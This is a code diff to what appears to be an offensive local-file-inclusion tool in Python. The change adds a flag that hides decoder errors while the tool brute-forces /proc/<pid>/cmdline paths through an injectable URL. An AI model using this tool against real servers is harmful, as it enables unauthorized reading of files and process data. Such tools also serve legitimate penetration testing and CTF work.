@@ -27,28 +27,30 @@ def lfi():
     print(f"LFI Mode!")
 
 
-def zip_decoder(response):
+def zip_decoder(response, noerr):
     try:
         with zipfile.ZipFile(io.BytesIO(response.content)) as zip_content:
             for zipinfo in zip_content.infolist():
                 with zip_content.open(zipinfo) as unzipped_file:
                     yield zipinfo.filename, unzipped_file.read().decode('utf-8')
     except zipfile.BadZipfile:
-        click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.LIGHTRED_EX} Decoder failed. Either a 404 or you're using an incorrect decoder (ZIP)")
+        # Show error only if not bruteforcing.
+        if not noerr:
+            click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.LIGHTRED_EX} Decoder failed. Either a 404 or you're using an incorrect decoder (ZIP)")
 
 
-def base64_decoder(response):
+def base64_decoder(response, noerr):
     print("Not implemented yet :(")
     exit()
 
-def no_decoder(response):
+def no_decoder(response, noerr):
     yield "raw", response.text
 
 
 lfi_decoder_map = {"zip": zip_decoder, "b64d": base64_decoder}
 
 
-def handle_lfi_request(target, decoder):
+def handle_lfi_request(target, decoder, noerr=False):
     with requests.Session() as _sess:
         resp = _sess.get(target)
         if decoder:
@@ -56,7 +58,7 @@ def handle_lfi_request(target, decoder):
         else:
             decode_func = no_decoder
 
-        for filename, result in decode_func(resp):
+        for filename, result in decode_func(resp, noerr):
             click.secho(f"{Fore.LIGHTYELLOW_EX}[LFI] {Fore.WHITE}Found: {Fore.LIGHTCYAN_EX}{filename}")
             click.secho(f"{Fore.WHITE}{result}")
             click.secho("------------------------------------------------------------------------------")
@@ -93,7 +95,7 @@ def interrogate(injectable, filter_mode, suffix, repeat_prefix, decoder):
                     for procid in target_range:
                         target = f"{injectable}{injection_prefix}/proc/{procid}/cmdline"
                         click.secho(f"{Fore.LIGHTCYAN_EX}-------------------------{Fore.WHITE}/proc/{procid}/cmdline{Fore.LIGHTCYAN_EX}-------------------------")
-                        handle_lfi_request(target, decoder)
+                        handle_lfi_request(target, decoder, noerr=True)
                 except Exception as ex:
                     click.secho(f"{Fore.LIGHTRED_EX} [LPBF] Invalid path bruteforce range specified. try: 'lpbf:1,1000' for proc/1 to proc/1000")
             else:
